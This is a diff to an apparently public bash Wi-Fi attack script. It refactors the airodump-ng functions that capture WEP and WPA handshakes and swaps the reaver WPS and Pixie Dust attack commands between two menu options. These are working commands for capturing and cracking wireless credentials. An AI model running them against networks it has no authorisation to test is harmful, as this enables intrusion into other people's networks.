@@ -27,6 +27,9 @@
 ############################################################################
 
 # v1.7
+# - Fixed "Interface Name" on stats banner.
+# - Updated airodump-ng scripting for several functions.
+# - Fixed PixeDust toggles. They were reversed, disable turned on and vice/versa.
 # - Updated airodump-ng windows to only scan for the encryption type that is currently being targeted.
 
 # v1.6
@@ -722,6 +725,8 @@ setVariablesRequired(){
 	bssid=""
 	essid=""
 	channel=""
+
+	noChannel="0"
 
 	# Update Stuff
 	updateMaster=https://raw.githubusercontent.com/esc0rtd3w/wifi-hacker/master/wifi-hacker.sh
@@ -3281,7 +3286,7 @@ initMonitorMode(){
 		getMacAddress
 		setMonitorMode
 		getMacAddressMonitor
-		getWirelessInterfaces "refresh"
+		#getWirelessInterfaces "refresh"
 		;;
 
 		"M" | "m")
@@ -3466,113 +3471,75 @@ autoModeNoPreviousSession(){
 
 adFileDump(){
 
+	noChannel="$1"
+	
+	#echo "$noChannel"
+	#read pause
+
 	currentTask="adFileDump"
 
+	echo ""
+	echo ""
+
 	case "$encryptionType" in
 
 		"wep")
-		echo ""
-		echo ""
 
 		disableChannelHopping
 
-		$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
-		#$terminal airodump-ng -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
-		#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
-		#read pause
+		case "$noChannel" in
 
-		#Working (uses session path)
-		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			"0")
+			$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
+			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			#read pause
 
-		echo ""
-		echo ""
+			#Working (uses session path)
+			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			;;
+
+			"1")
+			$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
+
+			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			#read pause
+
+			#Working (uses session path)
+			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			;;
+		esac
 		;;
 
-		"wpa")
+		"wpa" | "wpa2")
+
 		sleepMessage="Preparing to Capture WPA Handshake...."
 		doSleepMessage
 		sleep 3
 
 		disableChannelHopping
 
-		$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
-		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+		case "$noChannel" in
 
-		echo ""
-		echo ""
+			"0")
+			$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
+			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			;;
+
+			"1")
+			$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
+			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+
+			#Working (uses session path)
+			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			;;
+		esac
 		;;
-
-		"wpa2")
-		sleepMessage="Preparing to Capture WPA Handshake...."
-		doSleepMessage
-		sleep 3
-
-		disableChannelHopping
-
-		$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
-		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
-
-		echo ""
-		echo ""
-		;;
-
 	esac
 
-}
-
-
-adFileDumpNoChannel(){
-
-	currentTask="adFileDumpNoChannel"
-
-	case "$encryptionType" in
-
-		"wep")
-		echo ""
-		echo ""
-
-		$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
-
-		#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
-		#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
-		#read pause
-
-		#Working (uses session path)
-		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
-
-		echo ""
-		echo ""
-		;;
-
-		"wpa")
-		echo ""
-		echo ""
-
-		$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
-		#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
-
-		#Working (uses session path)
-		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
-
-		echo ""
-		echo ""
-		;;
-
-		"wpa2")
-		echo ""
-		echo ""
-
-		$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
-		#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
-
-		#Working (uses session path)
-		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
-
-		echo ""
-		echo ""
-		;;
-
-	esac
+	echo ""
+	echo ""
 
 }
 
@@ -5271,16 +5238,16 @@ menuAttacksWPS(){
 	
 		"1")
 		#echo "PixeDust Enabled"
+		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber
+		$reaver -i $interfaceMonitor -b $bssid -c $channel -vv -K $pixieNumber
 		#read pause
-		$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
-		#$reaver -i $interfaceMonitor -b $bssid -c $channel -vv
 		;;
 	
 		"2")
 		#echo "PixeDust Disabled"
+		$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
+		#$reaver -i $interfaceMonitor -b $bssid -c $channel -vv
 		#read pause
-		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber
-		$reaver -i $interfaceMonitor -b $bssid -c $channel -vv -K $pixieNumber
 		;;
 
 	esac
@@ -5409,29 +5376,32 @@ currentTask="reaverSaveCurrentSessionFile"
 
 menuBullyMain() {
 
-banner
-echo ""
-echo "Bully WPS Attack Menu"
-echo ""
-echo ""
-echo ""
-echo ""
-echo "Choose an option and press ENTER:"
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
+	banner
+	echo ""
+	echo "Bully WPS Attack Menu"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Choose an option and press ENTER:"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+
+	read pause
 
 }
+
 
 
 ############################################################################
@@ -6313,6 +6283,7 @@ getWirelessInterfaces(){
 
 			*)
 			interface="$manualSelectionManaged"
+			interfaceName="$manualSelectionManaged"
 			;;
 
 		esac
@@ -6343,6 +6314,7 @@ getWirelessInterfaces(){
 
 			*)
 			interfaceMonitor="$manualSelectionMonitor""mon"
+			interfaceName="$manualSelectionMonitor""mon"
 			;;
 
 		esac
